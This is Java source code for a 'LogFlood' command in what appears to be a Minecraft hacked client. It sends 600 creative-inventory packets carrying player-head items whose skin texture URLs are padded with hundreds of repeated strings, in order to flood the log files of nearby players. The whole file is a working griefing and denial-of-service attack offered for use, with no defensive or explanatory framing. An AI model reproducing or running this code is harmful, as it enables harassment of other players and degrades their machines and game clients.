/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtIntArray;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.helper.util.Utils;

import java.util.Base64;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;


public class LogFlood extends Command {
    final AtomicBoolean running = new AtomicBoolean(false);

    public LogFlood() {
        super("LogFlood", "Floods the log files of players in render distance", "logflood", "lflood");
    }

    @Override
    public void onExecute(String[] args) {
        if (running.get()) {
            error("Already running, give me a second");
            return;
        }
        running.set(true);
        new Thread(() -> {
            try {
                for (int i = 0; i < 600; i++) {
                    ItemStack push = new ItemStack(Items.PLAYER_HEAD, 1);
                    NbtCompound main = new NbtCompound();
                    NbtCompound skullowner = new NbtCompound();
                    NbtIntArray id = new NbtIntArray(new int[] { 1044599774, -91344643, -1626455549, -827872364 });
                    skullowner.put("Id", id);
                    skullowner.put("Name", NbtString.of("LFlood" + new Random().nextInt(50000)));
                    NbtCompound b = new NbtCompound();
                    NbtList d = new NbtList();
                    NbtCompound c = new NbtCompound();
                    String texture = "{\"textures\":{\"SKIN\":{\"url\":\"https://education.minecraft.net/wp-content/uploads/" + "OOPS".repeat(500) + new Random().nextInt(5000000) + ".png\"}}}";
                    String base = Base64.getEncoder().encodeToString(texture.getBytes());
                    c.put("Value", NbtString.of(base));
                    d.add(c);
                    b.put("textures", d);
                    skullowner.put("Properties", b);
                    main.put("SkullOwner", skullowner);
                    push.setNbt(main);
                    ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(ShadowMain.client.player.getInventory().selectedSlot + 36, push));
                    Utils.sleep(5);
                }
            } finally {
                running.set(false);
            }
        }).start();
    }
}
